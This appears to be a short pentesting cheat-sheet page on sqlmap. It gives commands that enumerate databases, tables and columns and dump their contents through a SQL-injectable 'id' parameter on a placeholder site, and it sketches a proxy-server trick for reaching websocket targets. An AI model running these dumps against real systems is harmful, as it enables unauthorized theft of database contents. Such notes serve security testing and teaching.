import Gist from 'react-gist';

# sqlmap

<p align="center">
    <img src={require("./assets/sqlmap.png").default}></img>
</p>

Use `-u` to define the target url and `--batch` to use the default behavior without asking for input.

In the next commands, `id` is a query parameter that is vulnerable to SQL injection.

Enumerate databases.

```bash
sqlmap -u "http://website.com/?id=1" --batch --dbs
```

Enumerate tables of a specific database.

```bash
sqlmap -u "http://website.com/?id=1" --batch --tables -D db_name
```

Enumerate tables content of a specific database.

```bash
sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name
```

Enumerate content by specifing table, column, and database.

```bash
sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name -T table_name -C col_name
```

## Extras

### Using sqlmap with websockets

sqlmap may not support all types of requests, including those made over websockets. Also, working with complex targets can sometimes be cumbersome using sqlmap alone.

To simplify the process, it is possible to set up a fake server as an intermediary. In this way, sqlmap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual target.

<p align="center">
    <img src={require("./assets/sqlmap_over_websockets.png").default}></img>
</p>

<Gist id="4adec402e51df2bf3e35066172abaebf" />
